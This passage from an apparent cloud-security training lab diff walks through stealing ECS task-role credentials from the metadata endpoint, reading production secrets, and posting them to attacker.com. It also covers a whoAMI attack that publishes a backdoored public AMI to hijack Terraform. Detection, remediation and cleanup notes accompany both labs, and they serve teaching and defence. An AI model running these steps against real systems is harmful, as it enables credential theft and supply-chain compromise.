+$ aws ecs update-service --cluster production \
+    --service webapp-service --force-new-deployment
+
+$ # 3. Enable image tag immutability to prevent recurrence
+$ aws ecr put-image-tag-mutability \
+    --repository-name webapp \
+    --image-tag-mutability IMMUTABLE</div>
+      </div>
+    </div>
+  </div>
+
+  <div class="lab-note">
+    <i class="fa-solid fa-triangle-exclamation"></i> Defense: Enable ECR image tag immutability, use image digest pinning in ECS task definitions, and implement image signing with AWS Signer or Sigstore/Cosign. Enforce that only the CI/CD pipeline role has <code>ecr:PutImage</code> permissions via SCPs.
+  </div>
+</div>
+
+<hr class="lab-divider">
+
+<div class="lab-walkthrough-content" id="M13-L04-content">
+  <div class="lab-objective">
+    <i class="fa-solid fa-crosshairs"></i>
+    <strong>Objective:</strong> From inside a compromised ECS container (via the backdoored image), extract task role credentials via the metadata endpoint and pivot to other AWS services.
+  </div>
+
+  <div class="lab-disclaimer">
+    <i class="fa-solid fa-triangle-exclamation"></i>
+    <strong>Authorized Testing Only.</strong> This lab is for authorized testing only. Never perform these actions on systems you don't have explicit written permission to test.
+  </div>
+
+  <div class="lab-prereqs">
+    <div class="prereq-title"><i class="fa-solid fa-list-check"></i> Prerequisites</div>
+    <ul>
+      <li>Active callback from a compromised ECS container (Lab 3) or direct shell access via <code>aws ecs execute-command</code></li>
+      <li><code>curl</code> and <code>jq</code> available inside the container (or equivalent — Alpine's <code>wget</code> can substitute for <code>curl</code>)</li>
+      <li>ECS task has an IAM task role attached (check <code>$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI</code> being set)</li>
+      <li>AWS CLI optionally available — but raw <code>curl</code> to the metadata endpoint works without it</li>
+    </ul>
+  </div>
+
+  <div class="lab-steps">
+
+    <div class="lab-step">
+      <div class="step-num">1</div>
+      <div class="step-content">
+        <div class="step-desc">Query the ECS container metadata endpoint to extract temporary IAM credentials. ECS uses <code>169.254.170.2</code> — different from EC2's <code>169.254.169.254</code>.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">bash-5.1# echo $AWS_CONTAINER_CREDENTIALS_RELATIVE_URI</div>
+            <div class="terminal-output">/v2/credentials/a1b2c3d4-e5f6-7890-abcd-ef1234567890</div>
+            <div class="terminal-cmd">bash-5.1# curl -s http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI | jq</div>
+            <div class="terminal-output">{
+    "AccessKeyId": "ASIAIOSFODNN7ECSROLE",
+    "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYECSROLEKEY",
+    "Token": "FwoGZXIvYXdzEBYaDH7v8GRtPl...(truncated)",
+    "Expiration": "2026-04-01T20:35:22Z",
+    "RoleArn": "arn:aws:iam::123456789012:role/ecs-webapp-task-role"
+}</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <div class="step-num">2</div>
+      <div class="step-content">
+        <div class="step-desc">Confirm the identity and scope of the task role. Identify the account, role name, and any additional metadata.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">bash-5.1# export AWS_ACCESS_KEY_ID="ASIAIOSFODNN7ECSROLE"
+bash-5.1# export AWS_SECRET_ACCESS_KEY="wJalrXUtnFEMI/K7MDENG/bPxRfiCYECSROLEKEY"
+bash-5.1# export AWS_SESSION_TOKEN="FwoGZXIvYXdzEBYaDH7v8GRtPl..."
+bash-5.1# aws sts get-caller-identity</div>
+            <div class="terminal-output">{
+    "UserId": "AROA3XFRBF23ECSTASK:a1b2c3d4-e5f6-7890",
+    "Account": "123456789012",
+    "Arn": "arn:aws:sts::123456789012:assumed-role/ecs-webapp-task-role/a1b2c3d4-e5f6-7890"
+}</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <div class="step-num">3</div>
+      <div class="step-content">
+        <div class="step-desc">Enumerate the permissions of the task role by probing common high-value services.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">bash-5.1# aws s3 ls 2>&amp;1 | head -5</div>
+            <div class="terminal-output">2024-01-10 08:22:11 prod-customer-data-bucket
+2024-02-15 14:33:22 prod-application-logs
+2024-03-01 09:11:44 prod-backups-encrypted</div>
+            <div class="terminal-cmd">bash-5.1# aws dynamodb list-tables 2>&amp;1</div>
+            <div class="terminal-output">{
+    "TableNames": ["users", "sessions", "orders", "payments"]
+}</div>
+            <div class="terminal-cmd">bash-5.1# aws secretsmanager list-secrets --query 'SecretList[*].Name' 2>&amp;1</div>
+            <div class="terminal-output">["prod/database/credentials", "prod/api/third-party-keys"]</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <div class="step-num">4</div>
+      <div class="step-content">
+        <div class="step-desc">Pivot to high-value resources — extract database credentials from Secrets Manager to enable direct database access.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">bash-5.1# aws secretsmanager get-secret-value \
+    --secret-id prod/database/credentials \
+    --query 'SecretString' --output text | jq</div>
+            <div class="terminal-output">{
+    "engine": "postgres",
+    "host": "prod-db.cluster-a1b2c3d4e5f6.us-east-1.rds.amazonaws.com",
+    "port": 5432,
+    "username": "app_user",
+    "password": "Pr0d-DB-P@ssw0rd!2026",
+    "dbname": "webapp_production"
+}</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <div class="step-num">5</div>
+      <div class="step-content">
+        <div class="step-desc">Exfiltrate the task role credentials outside the container for persistent access from the attacker's machine — these creds are valid until automatic rotation (typically 1 hour).</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">bash-5.1# # Exfiltrate credentials via HTTP to attacker machine
+bash-5.1# CREDS=$(curl -s http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI)
+bash-5.1# curl -s -X POST http://attacker.com/creds \
+    -d "$CREDS"</div>
+            <div class="terminal-output"># Attacker receives the JSON credential blob
+# Use on attacker machine:
+# export AWS_ACCESS_KEY_ID="ASIAIOSFODNN7ECSROLE"
+# export AWS_SECRET_ACCESS_KEY="wJalrXUtnFEMI/..."
+# export AWS_SESSION_TOKEN="FwoGZXIvYXdz..."
+# NOTE: Task role creds expire — combine with Lab 3 technique to create
+# a long-lived IAM backdoor before expiry</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+  </div>
+
+  <div class="lab-detection">
+    <div class="detection-title"><i class="fa-solid fa-magnifying-glass"></i> Detection Notes</div>
+    <ul>
+      <li><strong>CloudTrail:</strong> API calls from a task role (<code>arn:aws:sts::...:assumed-role/ecs-webapp-task-role/...</code>) to services outside the application's normal operation (e.g., <code>secretsmanager:GetSecretValue</code> for secrets not normally accessed, <code>iam:CreateUser</code>) are high-fidelity signals</li>
+      <li>VPC Flow Logs: outbound HTTP connections from ECS task ENIs to non-approved external IPs indicate credential exfiltration or beaconing</li>
+      <li>CloudTrail: task role calls originating from the ECS task's source IP but accessing resources across multiple accounts is a lateral movement indicator</li>
+      <li>Enable <code>IMDSv2</code> (required token-based requests) — for ECS this translates to blocking direct metadata endpoint access without <code>AWS_CONTAINER_CREDENTIALS_RELATIVE_URI</code> token, which is set by the ECS agent</li>
+    </ul>
+  </div>
+
+  <div class="lab-mitre">
+    <div class="mitre-title"><i class="fa-solid fa-shield-halved"></i> MITRE ATT&amp;CK Mappings</div>
+    <div class="mitre-tags">
+      <span class="mitre-tag">T1552.005 — Cloud Instance Metadata API</span>
+      <span class="mitre-tag">T1078.004 — Valid Accounts: Cloud Accounts</span>
+      <span class="mitre-tag">T1530 — Data from Cloud Storage</span>
+      <span class="mitre-tag">T1021.007 — Remote Services: Cloud Services</span>
+    </div>
+  </div>
+
+  <div class="attack-flow">
+    <div class="flow-title"><i class="fa-solid fa-diagram-project"></i> Attack Flow</div>
+    <div class="flow-diagram">
+      <div class="flow-node">ECS Container</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">169.254.170.2</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Task Role Creds</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node highlight">S3 / DynamoDB / Secrets</div>
+    </div>
+  </div>
+
+  <div class="lab-cleanup">
+    <div class="cleanup-title"><i class="fa-solid fa-broom"></i> Cleanup</div>
+    <p>This lab uses the already-deployed backdoored container. No additional resources are created during metadata credential extraction. Revoke the task role session by rotating the role's trust policy or by forcing ECS to deploy a new task (which generates new credential token IDs). Restore the clean image per Lab 3 cleanup steps.</p>
+  </div>
+
+  <div class="lab-note">
+    <i class="fa-solid fa-triangle-exclamation"></i> ECS metadata lives at <code>169.254.170.2</code> — different from EC2's <code>169.254.169.254</code>. Task role credentials rotate automatically but are accessible to any process in the container. Apply least-privilege to task roles and use resource-based conditions to restrict task role usage to expected VPC CIDRs.
+  </div>
+</div>
+
+<hr class="lab-divider">
+
+<div class="lab-walkthrough-content" id="M13-L05-content">
+  <div class="lab-objective">
+    <i class="fa-solid fa-crosshairs"></i>
+    <strong>Objective:</strong> Execute a "whoAMI" name-confusion attack by publishing a public AMI that matches a victim's Terraform <code>aws_ami</code> data source name filter when the <code>owners</code> field is missing.
+  </div>
+
+  <div class="lab-disclaimer">
+    <i class="fa-solid fa-triangle-exclamation"></i>
+    <strong>Authorized Testing Only.</strong> This lab is for authorized testing only. Never perform these actions on systems you don't have explicit written permission to test.
+  </div>
+
+  <div class="lab-prereqs">
+    <div class="prereq-title"><i class="fa-solid fa-list-check"></i> Prerequisites</div>
+    <ul>
+      <li>An attacker-controlled AWS account (separate from the target organization)</li>
+      <li>EC2 permissions in the attacker account: <code>ec2:RunInstances</code>, <code>ec2:CreateImage</code>, <code>ec2:ModifyImageAttribute</code></li>
+      <li>SSH key pair in the attacker account for instance access</li>
+      <li>Knowledge of the target's AMI name filter pattern — discoverable via Terraform code in public repositories, job postings referencing specific AMI names, or infrastructure documentation leaks</li>
+      <li>Terraform installed locally for demonstration (Step 4)</li>
+      <li>Read the whoAMI research: <a href="https://www.datadog.com/blog/whoami-attack/" target="_blank">Datadog Security Labs — whoAMI (February 2025)</a></li>
+    </ul>
+    <div class="prereq-note"><i class="fa-solid fa-circle-info"></i> <strong>whoAMI context:</strong> This attack was disclosed by Datadog Security Labs in February 2025. They found that approximately 1% of organizations in their dataset had vulnerable Terraform configurations. AWS patched their own non-production systems after responsible disclosure. The attack is conceptually similar to ECR supply chain poisoning but targets the AMI pull path rather than the container registry.</div>
+  </div>
+
+  <div class="lab-steps">
+
+    <div class="lab-step">
+      <div class="step-num">1</div>
+      <div class="step-content">
+        <div class="step-desc">Find the vulnerable Terraform configuration. The <code>aws_ami</code> data source uses a name filter and <code>most_recent = true</code> but crucially lacks the <code>owners</code> field — meaning it searches ALL public AMIs, including attacker-controlled ones.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ cat main.tf</div>
+            <div class="terminal-output">data "aws_ami" "app" {
+  most_recent = true
+
+  filter {
+    name   = "name"
+    values = ["my-app-*"]
+  }
+
+  # VULNERABILITY: no 'owners' field!
+  # This searches ALL public AMIs matching the name pattern
+  # Any AWS account can create "my-app-20260401" and win the race
+}</div>
+            <div class="terminal-cmd">$ # Compare with secure version:
+$ cat &lt;&lt;'EOF'
+data "aws_ami" "app" {
+  most_recent = true
+  owners      = ["self"]   # Only matches AMIs owned by this account
+
+  filter {
+    name   = "name"
+    values = ["my-app-*"]
+  }
+}
+EOF</div>
+            <div class="terminal-output">data "aws_ami" "app" {
+  most_recent = true
+  owners      = ["self"]   # Only matches AMIs owned by this account
+
+  filter {
+    name   = "name"
+    values = ["my-app-*"]
+  }
+}</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <div class="step-num">2</div>
+      <div class="step-content">
+        <div class="step-desc">Create a backdoored AMI from an attacker-controlled account. Launch an EC2 instance, install the backdoor via userdata or SSH, then create an AMI with a name that matches the target's filter pattern and is the most recent by timestamp.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ # In attacker's AWS account
+$ INSTANCE_ID=$(aws ec2 run-instances \
+    --image-id ami-0abcdef1234567890 \
+    --instance-type t3.micro \
+    --key-name attacker-key \
+    --query 'Instances[0].InstanceId' --output text)
+$ echo "Launched: $INSTANCE_ID"</div>
+            <div class="terminal-output">Launched: i-0a1b2c3d4e5f6a7b8</div>
+            <div class="terminal-cmd">$ # Wait for running state, then create AMI with matching name
+$ aws ec2 wait instance-running --instance-ids "$INSTANCE_ID"
+$ AMI_ID=$(aws ec2 create-image \
+    --instance-id "$INSTANCE_ID" \
+    --name "my-app-20260401" \
+    --description "Application server image" \
+    --query 'ImageId' --output text)
+$ echo "Created AMI: $AMI_ID"</div>
+            <div class="terminal-output">Created AMI: ami-0deadbeef12345678</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <div class="step-num">3</div>
+      <div class="step-content">
+        <div class="step-desc">Make the backdoored AMI public so it appears in the victim's cross-account AMI search. The name "my-app-20260401" will match their <code>my-app-*</code> filter and be newer than any existing org AMIs.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ aws ec2 modify-image-attribute \
+    --image-id ami-0deadbeef12345678 \
+    --launch-permission "Add=[{Group=all}]"</div>
+            <div class="terminal-output"># No output on success</div>
+            <div class="terminal-cmd">$ # Verify it's public
+$ aws ec2 describe-image-attribute \
+    --image-id ami-0deadbeef12345678 \
+    --attribute launchPermission</div>
+            <div class="terminal-output">{
+    "ImageId": "ami-0deadbeef12345678",
+    "LaunchPermissions": [
+        {
+            "Group": "all"
+        }
+    ]
+}</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <div class="step-num">4</div>
+      <div class="step-content">
+        <div class="step-desc">When the victim runs <code>terraform apply</code>, their data source selects the attacker's AMI because it is the most recent match by creation timestamp. All new instances launch with the backdoor baked in.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ # On victim's side — terraform plan shows attacker's AMI
+$ terraform plan</div>
+            <div class="terminal-output">data.aws_ami.app: Reading...
+data.aws_ami.app: Read complete after 1s [id=ami-0deadbeef12345678]
+                                            ^--- ATTACKER'S AMI — not the org's!
+
+Terraform will perform the following actions:
+
+  # aws_instance.app will be updated in-place
+  ~ resource "aws_instance" "app" {
+      ~ ami = "ami-0abcdef1234567890" -&gt; "ami-0deadbeef12345678"
+        # (16 unchanged attributes hidden)
+    }
+
+Plan: 0 to add, 1 to change, 0 to destroy.</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <div class="step-num">5</div>
+      <div class="step-content">
+        <div class="step-desc">Demonstrate the remediations — the secure Terraform pattern with <code>owners</code> and the AWS-native Allowed AMIs feature that prevents this class of attack at the account level.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ cat main_secure.tf</div>
+            <div class="terminal-output"># SECURE: Always specify owners to restrict AMI source
+data "aws_ami" "app" {
+  most_recent = true
+  owners      = ["self"]   # Only AMIs owned by this account
+  # Or: owners = ["123456789012"]  for a specific trusted account
+  # Or: owners = ["amazon"]  for Amazon-provided AMIs
+
+  filter {
+    name   = "name"
+    values = ["my-app-*"]
+  }
+}
+
+# ALSO: Enable AWS Allowed AMIs feature (account-level control)
+# Restricts which AMIs can be used in RunInstances calls within the account
+# aws ec2 enable-allowed-images-settings --allowed-images-settings-state audit-mode
+# aws ec2 replace-image-criteria-in-allowed-images-settings \
+#   --image-criteria "ImageProviders=amazon,self,123456789012"</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+  </div>
+
+  <div class="lab-detection">
+    <div class="detection-title"><i class="fa-solid fa-magnifying-glass"></i> Detection Notes</div>
+    <ul>
+      <li><strong>CloudTrail:</strong> <code>ec2:RunInstances</code> with an AMI ID not owned by your account, a trusted partner account, or Amazon — cross-reference <code>imageOwnerId</code> in the event against your approved AMI owner list</li>
+      <li>Terraform plan output: any AMI ID change that is not correlated with an explicit AMI build pipeline run should be flagged in policy-as-code scanning (Checkov, tfsec)</li>
+      <li>Checkov rule: <code>CKV_AWS_8</code> and similar rules flag <code>aws_ami</code> data sources missing <code>owners</code></li>
+      <li>AWS Config rule: <code>approved-amis-by-id</code> or <code>approved-amis-by-tag</code> can enforce that only approved AMIs are used in your account</li>
+    </ul>
+  </div>
+
+  <div class="lab-mitre">
+    <div class="mitre-title"><i class="fa-solid fa-shield-halved"></i> MITRE ATT&amp;CK Mappings</div>
+    <div class="mitre-tags">
+      <span class="mitre-tag">T1195.002 — Compromise Software Supply Chain</span>
+      <span class="mitre-tag">T1525 — Implant Internal Image</span>
+      <span class="mitre-tag">T1610 — Deploy Container</span>
+    </div>
+  </div>
+
+  <div class="attack-flow">
+    <div class="flow-title"><i class="fa-solid fa-diagram-project"></i> Attack Flow</div>
+    <div class="flow-diagram">
+      <div class="flow-node">Attacker AMI (matching name)</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Victim TF (no owner filter)</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Selects Attacker AMI</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node highlight">Backdoored Instances</div>
+    </div>
+  </div>
+
+  <div class="lab-cleanup">
+    <div class="cleanup-title"><i class="fa-solid fa-broom"></i> Cleanup</div>
+    <p>Clean up all attacker-controlled resources from the separate AWS account:</p>
+    <div class="terminal">
+      <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal — Cleanup (Attacker Account)</div>
+      <div class="terminal-body">
+        <div class="terminal-cmd">$ # 1. Deregister the public AMI
+$ aws ec2 deregister-image --image-id ami-0deadbeef12345678
+
+$ # 2. Terminate the source instance
+$ aws ec2 terminate-instances --instance-ids i-0a1b2c3d4e5f6a7b8
+
+$ # 3. Delete associated snapshots
+$ SNAP_ID=$(aws ec2 describe-snapshots --owner-ids self \
+    --query 'Snapshots[?Description==`"Created by CreateImage(i-0a1b2c3d4e5f6a7b8)""].SnapshotId' \
+    --output text)
+$ aws ec2 delete-snapshot --snapshot-id "$SNAP_ID"</div>
+      </div>
+    </div>
+  </div>
+
+  <div class="lab-note">
+    <i class="fa-solid fa-triangle-exclamation"></i> Approximately 1% of AWS organizations were vulnerable to whoAMI (Datadog research, February 2025). AWS patched their own non-production systems after disclosure. Always set <code>owners</code> in <code>aws_ami</code> data sources and enable the Allowed AMIs account-level feature. See the original research at: <a href="https://www.datadog.com/blog/whoami-attack/" target="_blank">datadog.com/blog/whoami-attack</a>.
+  </div>
+</div>
